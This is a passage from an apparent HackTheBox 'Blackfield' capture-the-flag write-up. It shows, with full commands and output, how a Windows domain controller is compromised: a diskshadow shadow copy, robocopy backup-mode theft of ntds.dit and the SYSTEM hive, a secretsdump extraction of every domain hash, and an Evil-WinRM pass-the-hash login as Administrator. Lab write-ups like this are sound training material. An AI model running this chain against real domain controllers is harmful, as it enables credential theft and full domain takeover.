diskshadow.exe /s c:\temp\diskshadow.txt
```

```
*Evil-WinRM* PS C:\temp> diskshadow.exe /s c:\temp\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  4/28/2024 9:29:25 AM

-> set context persistent nowriters
-> add volume c: alias temp
-> create

Alias temp for shadow ID {ac4fa5cf-c8f4-45af-99ee-ba88f3889a37} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {9ecb15b8-bf29-44b3-89f4-a6e2621aa18a} set as environment variable.

Querying all shadow copies with the shadow copy set ID {9ecb15b8-bf29-44b3-89f4-a6e2621aa18a}

        * Shadow copy ID = {ac4fa5cf-c8f4-45af-99ee-ba88f3889a37}               %temp%
                - Shadow copy set: {9ecb15b8-bf29-44b3-89f4-a6e2621aa18a}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 4/28/2024 9:29:26 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {ac4fa5cf-c8f4-45af-99ee-ba88f3889a37}
The shadow copy was successfully exposed as z:\.
->

```

I’ll now move to the `ntds` folder to check if the above commands worked or not:

```python
*Evil-WinRM* PS C:\temp> cd z:
*Evil-WinRM* PS z:\> cd windows
*Evil-WinRM* PS z:\windows> cd ntds
*Evil-WinRM* PS z:\windows\ntds> ls

    Directory: z:\windows\ntds

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/28/2024   9:06 AM           8192 edb.chk
-a----        4/28/2024   9:06 AM       10485760 edb.log
-a----        4/27/2024  11:48 AM       10485760 edb00006.log
-a----        4/27/2024  12:34 PM       10485760 edb00007.log
-a----        4/27/2024   1:20 PM       10485760 edb00008.log
-a----        4/27/2024   2:06 PM       10485760 edb00009.log
-a----        4/27/2024   2:51 PM       10485760 edb0000A.log
-a----        4/27/2024   3:37 PM       10485760 edb0000B.log
-a----        4/27/2024   4:23 PM       10485760 edb0000C.log
-a----        4/27/2024   5:09 PM       10485760 edb0000D.log
-a----        4/27/2024   5:54 PM       10485760 edb0000E.log
-a----        2/23/2020   3:13 AM       10485760 edbres00001.jrs
-a----        2/23/2020   3:13 AM       10485760 edbres00002.jrs
-a----        4/27/2024   5:54 PM       10485760 edbtmp.log
-a----        4/28/2024   9:06 AM       18874368 ntds.dit
-a----        4/28/2024   9:06 AM          16384 ntds.jfm
-a----        4/27/2024   6:51 AM         434176 temp.edb

*Evil-WinRM* PS z:\windows\ntds> cat ntds.dit
Access to the path 'z:\windows\ntds\ntds.dit' is denied.
At line:1 char:1
+ cat ntds.dit
+ ~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (z:\windows\ntds\ntds.dit:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

```

I was able to move into the `ntds` folder was unable to view the contents of the `ntds.dit`.

So, I can now use the `[robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)` command from Microsoft to move the backup `ntds.dit` file to my temp folder:

```python
*Evil-WinRM* PS z:\windows\ntds> robocopy /b .\ C:\temp NTDS.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, April 28, 2024 9:37:53 AM
   Source : z:\windows\ntds\
     Dest : C:\temp\

    Files : NTDS.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              18.0 m        ntds.dit
  0.0%

...SNIP...

100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00

   Speed :           150994944 Bytes/sec.
   Speed :            8640.000 MegaBytes/min.
   Ended : Sunday, April 28, 2024 9:37:53 AM

*Evil-WinRM* PS z:\windows\ntds> 
*Evil-WinRM* PS z:\windows\ntds> robocopy /b .\ C:\temp NTDS.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, April 28, 2024 9:40:23 AM
   Source : z:\windows\ntds\
     Dest : C:\temp\

    Files : NTDS.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         0         1         0         0         0
   Bytes :   18.00 m         0   18.00 m         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Sunday, April 28, 2024 9:40:23 AM

```

It shows that it completed the copy and then by checking the temp folder, I was able to confirm that it was copied.

```python
*Evil-WinRM* PS z:\windows\ntds> ls C:\temp

    Directory: C:\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/28/2024   9:29 AM            609 2024-04-28_9-29-26_DC01.cab
-a----        4/28/2024   9:27 AM             86 diskshadow.txt
-a----        4/28/2024   9:06 AM       18874368 ntds.dit
-a----        4/28/2024   7:18 AM          45056 sam
-a----        4/28/2024   7:18 AM       17580032 system

```

After grabbing the `ntds.dit` file, we will need to also grab the SYSTEM file from the registry and then send both of these over to our attacker machine to be dumped locally.

```

*Evil-WinRM* PS Z:\> cd C:\temp
*Evil-WinRM* PS C:\temp> reg.exe save hklm\system C:\temp\system.bak
The operation completed successfully.
```

I’ll now download these files using `Evil-WinRM's` `download` command:

```python
*Evil-WinRM* PS C:\temp> download ntds.dit
                                        
Info: Downloading C:\temp\ntds.dit to ntds.dit
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system.bak
                                        
Info: Downloading C:\temp\system.bak to system.bak
                                        
Info: Download successful!
```

With both files now on my attacker machine, I used `secretsdump.py` again and successfully dumped all of the hashes in the domain!

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ secretsdump.py -ntds ntds.dit -system system.bak LOCAL > ntds-hashes.txt
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ cat ntds-hashes.txt 
Impacket v0.12.0.dev1+20240304.182237.3ee3bb46 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:6f89993d1ad65c6cec99285c543e5b0d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:6c9521b1bd19701f1a1e3f87a4480027:::

...SNIP...
```

Retrieving the `administrator’s` hash:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ cat ntds-hashes.txt | grep Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1
                                                                                                                                                                                                                                                            
```

`Administrator's` Hash:

```python
Administrator : 184fb5e5178480be64824d4cd53b99ee
```

Using `Evil-WinRM` to obtain a shell:

```python
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/blackfield]
└─$ evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee

                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
```

Root flag:

```python
t*Evil-WinRM* PS C:\Users\Administrator\Documents>cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4375a629c7c67c8e29db269060c955cb

```